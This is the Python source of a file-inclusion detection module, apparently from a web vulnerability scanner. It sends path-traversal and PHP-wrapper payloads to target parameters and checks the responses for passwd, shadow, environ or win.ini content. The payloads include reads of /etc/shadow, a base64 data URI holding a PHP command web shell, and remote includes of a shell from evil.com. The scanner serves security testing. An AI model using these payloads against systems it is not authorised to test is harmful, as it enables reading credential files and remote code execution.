"""Local File Inclusion (LFI) and Remote File Inclusion (RFI) detection module."""
import httpx
from .async_base import AsyncBaseAttackModule


class LFIRFIModule(AsyncBaseAttackModule):
    """Detects Local and Remote File Inclusion vulnerabilities.
    
    LFI allows reading arbitrary files on the server's filesystem.
    RFI allows including and executing remote files.
    """
    
    # LFI payloads for various systems
    LFI_PAYLOADS = [
        # Unix/Linux
        '../../../etc/passwd',
        '../../etc/passwd',
        '../etc/passwd',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        
        # Windows
        '../../../windows/win.ini',
        '..\\..\\..\\windows\\win.ini',
        'C:\\windows\\win.ini',
        'C:/windows/win.ini',
        '..%5c..%5c..%5cwindows%5cwin.ini',
        
        # Null byte injection (older PHP)
        '../../../etc/passwd%00',
        '../../../windows/win.ini%00',
        
        # Path traversal with filters
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        
        # Absolute paths
        '/etc/passwd',
        '/etc/shadow',
        '/proc/self/environ',
        '/var/log/apache2/access.log',
        
        # PHP wrappers
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        'expect://ls',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    ]
    
    # RFI payloads (remote URLs)
    RFI_PAYLOADS = [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        '//evil.com/shell.txt',
        'http://127.0.0.1/shell.txt',
    ]
    
    # File content patterns to detect successful LFI
    LFI_PATTERNS = {
        '/etc/passwd': [
            'root:x:0:0:',
            'root:!:0:0:',
            'daemon:',
            '/bin/bash',
            '/bin/sh',
        ],
        'win.ini': [
            '[extensions]',
            '[files]',
            '[fonts]',
            'for 16-bit app support',
        ],
        '/etc/shadow': [
            'root:$',
            'root:!:',
        ],
        '/proc/self/environ': [
            'HTTP_USER_AGENT=',
            'PATH=',
            'HOME=',
        ],
        'php_file': [
            '<?php',
            'function ',
            '$_GET',
            '$_POST',
            'include(',
            'require(',
        ]
    }
    
    def name(self) -> str:
        """Return module name."""
        return "lfi_rfi"
    
    def description(self) -> str:
        """Return module description."""
        return "Detects Local and Remote File Inclusion vulnerabilities"
    
    def check_applicable(self, parameter: dict, context: dict) -> bool:
        """Check if LFI/RFI testing applies to this parameter.
        
        Args:
            parameter: Parameter dict with 'name', 'value', 'location'
            context: Context dict with 'url', 'method', 'all_params'
        
        Returns:
            bool: True if this module should test the parameter
        """
        param_name = parameter.get('name', '')
        if param_name is None:
            return False
        
        param_name_lower = param_name.lower()
        
        # File inclusion-prone parameter names
        file_keywords = [
            'file', 'path', 'page', 'include', 'template', 'doc', 'document',
            'folder', 'dir', 'directory', 'load', 'read', 'view', 'download',
            'cat', 'show', 'display', 'source', 'src', 'lang', 'language',
            'module', 'style', 'theme', 'skin', 'layout'
        ]
        
        return any(keyword in param_name_lower for keyword in file_keywords)
    
    async def scan(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Scan for LFI/RFI vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            client: httpx AsyncClient
        
        Returns:
            list: Findings
        """
        findings = []
        
        # Test LFI
        findings.extend(await self._test_lfi(url, parameter, client))
        
        # Test RFI (only if LFI not found to save time)
        if not findings and self.config.get('test_rfi', False):
            findings.extend(await self._test_rfi(url, parameter, client))
        
        return findings
    
    async def _test_lfi(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Test for Local File Inclusion.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings
        """
        findings = []
        
        try:
            # Get baseline
            baseline_params = {parameter['name']: parameter['value']}
            baseline_response = await client.get(url, params=baseline_params, timeout=self.timeout)
            baseline_text = baseline_response.text.lower()
            
            # Test each LFI payload
            for payload in self.LFI_PAYLOADS[:15]:  # Limit for efficiency
                try:
                    test_params = {parameter['name']: payload}
                    response = await client.get(url, params=test_params, timeout=self.timeout)
                    response_text = response.text.lower()
                    
                    # Check for file content patterns
                    detected_patterns = []
                    
                    # Determine which patterns to check based on payload
                    if 'passwd' in payload:
                        patterns_to_check = self.LFI_PATTERNS['/etc/passwd']
                    elif 'win.ini' in payload:
                        patterns_to_check = self.LFI_PATTERNS['win.ini']
                    elif 'shadow' in payload:
                        patterns_to_check = self.LFI_PATTERNS['/etc/shadow']
                    elif 'environ' in payload:
                        patterns_to_check = self.LFI_PATTERNS['/proc/self/environ']
                    elif 'php://' in payload or 'index.php' in payload:
                        patterns_to_check = self.LFI_PATTERNS['php_file']
                    else:
                        patterns_to_check = (
                            self.LFI_PATTERNS['/etc/passwd'] + 
                            self.LFI_PATTERNS['win.ini']
                        )
                    
                    # Check patterns
                    for pattern in patterns_to_check:
                        if pattern.lower() in response_text and pattern.lower() not in baseline_text:
                            detected_patterns.append(pattern)
                    
                    # If patterns detected, report vulnerability
                    if detected_patterns:
                        findings.append({
                            'name': 'Local File Inclusion (LFI)',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'File content patterns detected: {", ".join(detected_patterns[:3])}',
                            'recommendation': 'Never pass user input directly to file system functions. Use allowlists for permitted files, validate inputs, and use absolute paths with basename() to prevent directory traversal.'
                        })
                        return findings  # Found LFI, stop testing
                    
                    # Check for PHP wrapper responses (base64 encoded content)
                    if 'php://filter' in payload and 'base64' in payload:
                        # Base64 content is often very long and has distinct characteristics
                        if len(response_text) > len(baseline_text) + 500:
                            # Check if response looks like base64
                            import re
                            base64_pattern = re.compile(r'^[A-Za-z0-9+/]{100,}={0,2}$', re.MULTILINE)
                            if base64_pattern.search(response.text):
                                findings.append({
                                    'name': 'Local File Inclusion (LFI) - PHP Wrapper',
                                    'severity': 'Critical',
                                    'url': url,
                                    'parameter': parameter['name'],
                                    'payload': payload,
                                    'evidence': 'PHP filter wrapper returned base64-encoded file content',
                                    'recommendation': 'Disable PHP wrappers (allow_url_fopen, allow_url_include) and implement strict input validation.'
                                })
                                return findings
                
                except Exception as e:
                    if self.config.get('verbose'):
                        print(f"Error testing LFI payload {payload}: {e}")
                    continue
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error in LFI testing: {e}")
        
        return findings
    
    async def _test_rfi(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Test for Remote File Inclusion.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings
        """
        findings = []
        
        try:
            # Get baseline
            baseline_params = {parameter['name']: parameter['value']}
            baseline_response = await client.get(url, params=baseline_params, timeout=self.timeout)
            
            # Test RFI payloads
            for payload in self.RFI_PAYLOADS[:2]:  # Very limited testing
                try:
                    test_params = {parameter['name']: payload}
                    response = await client.get(url, params=test_params, timeout=self.timeout)
                    
                    # Check for indicators that remote file was loaded
                    indicators = [
                        'failed to open stream',
                        'http:// wrapper is disabled',
                        'allow_url_include',
                        'allow_url_fopen',
                        'URL file-access is disabled',
                        'no such file or directory',
                    ]
                    
                    response_lower = response.text.lower()
                    baseline_lower = baseline_response.text.lower()
                    
                    for indicator in indicators:
                        if indicator in response_lower and indicator not in baseline_lower:
                            findings.append({
                                'name': 'Potential Remote File Inclusion (RFI)',
                                'severity': 'High',
                                'url': url,
                                'parameter': parameter['name'],
                                'payload': payload,
                                'evidence': f'Server attempted to load remote file: "{indicator}"',
                                'recommendation': 'Disable allow_url_fopen and allow_url_include in PHP configuration. Validate and sanitize all user input used in file operations.'
                            })
                            return findings
                    
                    # Check if response significantly different (may have loaded remote content)
                    if abs(len(response.text) - len(baseline_response.text)) > 1000:
                        findings.append({
                            'name': 'Potential Remote File Inclusion (RFI)',
                            'severity': 'High',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': 'Response changed significantly when remote URL provided',
                            'recommendation': 'Disable allow_url_fopen and allow_url_include. Implement strict input validation.'
                        })
                        return findings
                
                except Exception as e:
                    if self.config.get('verbose'):
                        print(f"Error testing RFI payload {payload}: {e}")
                    continue
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error in RFI testing: {e}")
        
        return findings
